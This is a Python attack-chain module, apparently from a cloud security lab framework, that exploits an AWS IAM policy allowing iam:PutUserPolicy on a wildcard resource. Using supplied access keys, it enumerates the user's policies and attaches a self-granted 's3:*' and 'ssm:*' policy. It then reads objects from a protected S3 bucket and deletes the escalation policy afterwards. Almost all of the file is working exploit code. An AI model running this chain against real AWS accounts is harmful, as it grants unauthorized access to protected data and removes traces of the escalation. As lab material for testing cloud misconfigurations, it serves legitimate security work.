"""IAM Privilege Escalation attack chain."""

import json

import boto3

from stormforge.core.attack import AttackResult, BaseAttackChain


class AttackChain(BaseAttackChain):
    """Exploits IAM self-service policy misconfiguration to escalate privileges."""

    def run(self) -> AttackResult:
        access_key = self.require_output("access_key_id")
        secret_key = self.require_output("secret_access_key")
        region = self.get_output("aws_region", "us-east-1")
        bucket_name = self.require_output("protected_bucket")

        session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name=region,
        )

        iam = session.client("iam")
        s3 = session.client("s3")

        # Step 1: Get current user
        self.log("Enumerating current user...")
        user = iam.get_user()
        username = user["User"]["UserName"]
        self.log(f"Current user: {username}")

        # Step 2: List policies
        self.log("Listing attached policies...")
        policies = iam.list_user_policies(UserName=username)
        self.debug(f"Policies: {policies['PolicyNames']}")

        # Step 3: Check for misconfigured self-service policy
        self.log("Analyzing policy permissions...")
        for policy_name in policies["PolicyNames"]:
            policy = iam.get_user_policy(UserName=username, PolicyName=policy_name)
            doc = policy["PolicyDocument"]
            self.debug(f"{policy_name}: {json.dumps(doc, indent=2)}")

            if self._has_put_policy_wildcard(doc):
                self.log(f"Found vulnerable policy: {policy_name}")
                break
        else:
            return AttackResult(
                success=False,
                message="No exploitable policy found",
                log=self._log,
            )

        # Step 4: Escalate privileges
        self.log("Escalating privileges...")
        escalation_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": ["s3:*", "ssm:*"],
                    "Resource": "*",
                }
            ],
        }

        iam.put_user_policy(
            UserName=username,
            PolicyName="EscalatedAccess",
            PolicyDocument=json.dumps(escalation_policy),
        )
        self.log("Attached escalation policy")

        # Step 5: Access protected bucket
        self.log(f"Accessing protected bucket: {bucket_name}")
        try:
            response = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
            objects = [obj["Key"] for obj in response.get("Contents", [])]
            self.log(f"Found objects: {objects}")

            if objects:
                obj = s3.get_object(Bucket=bucket_name, Key=objects[0])
                content = obj["Body"].read().decode("utf-8")[:200]
                self.log(f"Sample content: {content}...")

        except Exception as e:
            return AttackResult(
                success=False,
                message=f"Failed to access bucket: {e}",
                log=self._log,
            )

        # Step 6: Cleanup
        self.log("Cleaning up escalation policy...")
        iam.delete_user_policy(UserName=username, PolicyName="EscalatedAccess")

        return AttackResult(
            success=True,
            message="Successfully escalated privileges and accessed protected data",
            log=self._log,
            data={"bucket": bucket_name, "objects": objects},
        )

    def _has_put_policy_wildcard(self, doc: dict) -> bool:
        """Check if policy allows iam:PutUserPolicy with wildcard resource."""
        for statement in doc.get("Statement", []):
            if statement.get("Effect") != "Allow":
                continue

            actions = statement.get("Action", [])
            if isinstance(actions, str):
                actions = [actions]

            resources = statement.get("Resource", [])
            if isinstance(resources, str):
                resources = [resources]

            has_put = any(
                a in ("iam:*", "iam:PutUserPolicy", "iam:Put*") for a in actions
            )
            has_wildcard = any("*" in r and "${aws:username}" not in r for r in resources)

            if has_put and has_wildcard:
                return True

        return False